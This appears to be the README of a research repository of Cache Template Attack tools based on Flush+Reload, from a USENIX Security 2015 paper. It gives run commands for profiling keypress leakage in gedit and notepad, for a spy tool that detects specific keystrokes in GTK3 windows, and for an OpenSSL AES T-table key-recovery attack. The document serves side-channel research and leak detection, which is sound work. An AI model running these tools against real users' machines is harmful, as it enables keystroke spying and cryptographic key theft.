# Cache Template Attacks
This repository contains several tools to perform Cache Template Attacks.

Cache Template Attacks are a new generic attack technique, allowing to profile and exploit cache-based information leakage of any program automatically, without prior knowledge of specific software versions or even specific system information.

The underlying cache attack used in this repository is Flush+Reload as presented by Yarom and Falkner in "[FLUSH+RELOAD: a High Resolution, Low Noise, L3 Cache Side-Channel Attack](https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/yarom)" (2014).

The "[Cache Template Attacks](https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/gruss)" paper by Gruss, Spreitzer and Mangard was published at USENIX Security 2015.

## One note before starting

The programs should work on x86-64 Intel CPUs independent of the operating system (as long as you can compile it). Different OS specific version of the tools are provided in subfolders.

**Warning:** This code is provided as-is. You are responsible for protecting yourself, your property and data, and others from any risks caused by this code. This code may not detect vulnerabilities of your applications. This code is only for testing purposes. Use it only on test systems which contain no sensitive data.

## Getting started: Calibration
Before starting the Cache Template Attack you have to find the cache hit/miss threshold of your system.

Use the calibration tool for this purpose:
```
cd calibration
make
./calibration
```
This program should print a histogram for cache hits and cache misses. Based on the histogram it suggests a suitable threshold value (this value is also returned by the program).

**Note:** In most programs I defined a constant MIN_CACHE_MISS_CYCLES. Change it based on your threshold, if necessary.

## Getting started: Automated keypress profiling
It is helpful to start with well observable events like key strokes and an application which is known to process such events (for instance an editor). You find the profiling tools in the profiling folder.

Run the following commands to find keypress information leakage in a program (the program should be running and it should have focus as soon as you started the spy script):
```
cd profiling/linux_low_frequency_example
make
./spy.sh 5 200 gedit # in our example we profile keypresses in gedit
```
The resulting log file is in a format which can be parsed by LibreOffice Calc or similar software.
You can analyze information leakage through the cache using this log file.

## In detail: Keypresses (with libxdotool)
In this example we perform some steps by hand to illustrate what happens in the background.
Therefore, we will first find the address range to attack.
```
$ cat /proc/`ps -A | grep gedit | grep -oE "^[0-9]+"`/maps | grep r-x | grep gdk-3
7fc963a05000-7fc963ab4000 r-xp 00000000 fc:01 2637370                    /usr/lib/x86_64-linux-gnu/libgdk-3.so.0.1200.2
```
We do not care about the virtual addresses, but only the size of the address range and the offset in the file (which is 00000000 in this example). This is also the reason why we don't have to think about address space layout randomization.

**Note:** On Windows you can use the tool vmmap to find the same information.

This line can directly be passed to the profiling tool in the following step. We will create a Cache Template in this step. Using the libxdo library. Be sure to install it before trying this.

**Note:** There is a second version which runs without libxdo, but then you have to issue the events by some other means.

During the profiling we will simulate a huge number of key presses. Therefore, your test system will probably not be usable for a few minutes to hours. Switch to an already opened gedit window before ./spy is started.
On Linux, run the following lines:
```
cd profiling/linux_low_frequency_example
make
echo "switch to gedit window"
sleep 5; ./spy 200 7fc963a05000-7fc963ab4000 r-xp 00000000 fc:01 2637370                    /usr/lib/x86_64-linux-gnu/libgdk-3.so.0.1200.2 > libgdk.csv
```
On Windows with MSYS/MinGW, run the following lines:
```
cd profiling/windows_low_frequency_example
mingw32-make
echo "switch to notepad window"
sleep 5; ./spy 200 C:\Windows\System32\notepad.exe > notepad.csv
```

The resulting log file is in a format which can be parsed by LibreOffice Calc or similar software.
You can analyze information leakage through the cache using this log file.

You are generally looking for events which have single high peaks, like the following:
```
file,  addr,   0,   1,   2,   3,   4,   5,   6,   7,   8,   9,   a,   b,   c,   d,   e,   f,   g,   h,   i,   j,   k,   l,   m,   n,   o,   p,   q,   r,   s,   t,   u,   v,   w,   x,   y,   z
/usr/lib/x86_64-linux-gnu/libgdk-3.so.0.1200.2, 0x85ec0,=   3/ 110,=   0/ 112,=   0/ 117,=   0/ 122,=   0/ 120,=   1/ 123,=   0/ 125,=   0/ 123,=   1/ 124,=   0/ 124,=   1/ 123,=   0/ 120,=   0/ 122,=   0/ 121,=   0/ 122,=   0/ 123,=   0/ 122,=   0/ 123,=   1/ 123,=   1/ 121,=   0/ 118,=   0/ 123,=   0/ 122,= 126/ 122,=   0/ 122,=   2/ 117,=   0/ 117,=   0/ 119,=   0/ 121,=   0/ 123,=   3/ 118,=  14/ 122,=   0/ 120,=   0/ 122,=   0/ 117,=   4/ 116
```
This one had 126 cache hits during 122 key presses of the key N. And almost none when pressing other keys.

To verify our results we will now use the generic exploitation spy tool:
```
cd exploitation/generic
make
./spy /usr/lib/x86_64-linux-gnu/libgdk-3.so.0.1200.2 0x85ec0
```
Now this tool prints a message exactly when a user presses N (in any GTK3 window).
This spy tool can also be used on Windows just like that.

## In detail: Keypresses (without libxdotool)
Without libxdotool we can use the generic low frequency profiling tool.
This tool requires you to generate the events somehow. Depending on what you want to profile this can be another program simulating key strokes, a jammed key, a program which constantly triggers the event to exploit (an encryption...).
In our case we will just jam a key and create a Cache Template showing which addresses react on key strokes. To filter false positive cache hits we should then perform a second profiling scan without jamming a key.

**Note:** Cache Template Attacks can be fully automated, but this requires the event to be automated as well. In the previous example we used libxdotool for this purpose.

On Windows or OSX you might not have procfs to retrieve the shared library mappings.
However, on Windows there is vmmap which gives you the same information and on OSX you can use at least ldd and scan the binary itself. Therefore, we execute the generic example tool similar as before:
```
cd profiling/generic_low_frequency_example
make
sleep 5; ./spy 200 7fc963a05000-7fc963ab4000 r-xp 00000000 fc:01 2637370                    /usr/lib/x86_64-linux-gnu/libgdk-3.so.0.1200.2 > libgdk.csv
```

## OpenSSL AES T-Table attack
This example requires a self-compiled OpenSSL library to enable it's T-Table-based AES implementation.
Place libcrypto.so in the same folder and make sure the program actually uses it as a shared library.
Then run
```
cd profiling/aes_example
make
./spy
```
The T-Table is easily locatable in the log file as there are only 64 addresses which are frequently accessed, but not always accessed.
Subsequently, you can monitor addresses from the profile to derive information about secret keys.

In the exploitation phase the spy tool has to trigger encryptions itself with an unknown key and can then trivially determine the upper 4 bits of each key byte after about 64 encryptions.

Of course, we know that OpenSSL does not use a T-Table-based AES implementation anymore. But you can use this tool to profile any (possibly closed-source) binary to find whether it contains a crypto algorithm which leaks key dependent information through the cache. Just trigger the algorithm execution with fixed keys 

## Fully automated attack
In this example we will run a script which will automatically execute the profiling phase as described before and then switch to the multi_spy exploitation tool as soon as a result is available.

Then run
```
cd exploitation/multi_spy
make
cd ../../profiling/linux_low_frequency_automated
./spy.sh 5 200 /usr/lib/x86_64-linux-gnu/libgdk-3.so.0.1200.2
```
The spy tool should switch into exploitation mode after profiling is completed. The result of the profiling phase is printed on the screen, for instance:
```
Events per address:
 0x85d00:q
 0x85d40:q
 0x85d80:ghijklnqtuvwz
 0x85dc0:iuzn
 0x85e00:iznuj
 0x85e40:inzu
 0x85e80:n
 0x85ec0:n
```

That's it, now it's up to you to find out which of your software leaks data and how it could be exploited. I hope it helps you closing these leaks.
